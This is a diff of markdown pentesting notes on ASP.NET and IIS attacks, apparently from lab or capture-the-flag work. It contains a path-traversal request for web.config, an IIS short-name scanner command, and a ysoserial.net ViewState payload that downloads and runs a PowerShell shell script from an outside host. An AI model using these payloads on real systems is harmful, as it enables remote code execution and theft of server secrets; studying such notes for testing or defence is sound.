@@ -16,9 +16,7 @@ seo:
   robots: "" # custom robot tags (optional)
   noindex: false # false (default) or true
 ---
-
-
-**Exploring Binary Files with path traversal **
+## Exploring Binary Files with path traversal 
 
 ```sh
 GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
@@ -36,7 +34,7 @@ Host: example-mvc-application.minded
   config
   php
 
-**Microsoft IIS tilde character “~” Vulnerability/Feature – Short File/Folder Name Disclosure**
+## Microsoft IIS tilde character “~” Vulnerability/Feature – Short File/Folder Name Disclosure
 
 - Download the tool:
 ```sh
@@ -47,7 +45,7 @@ wget https://github.com/irsdl/IIS-ShortName-Scanner
 java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/
 ```
 
-**ViewState exploitation knowing secrets **
+## ViewState exploitation knowing secrets
 
 - Resources : 
 https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/
@@ -80,11 +78,6 @@ https://github.com/pwntester/ysoserial.net/releases/tag/v1.36
 ```sh
 ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.18:8080/shell.ps1') "  --decryptionalg="AES"  --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx"
 ```
-
-**Not knowing Viewstate secrets **
-
-- Resources :
-  https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
 
 ### Web config file upload : 
 
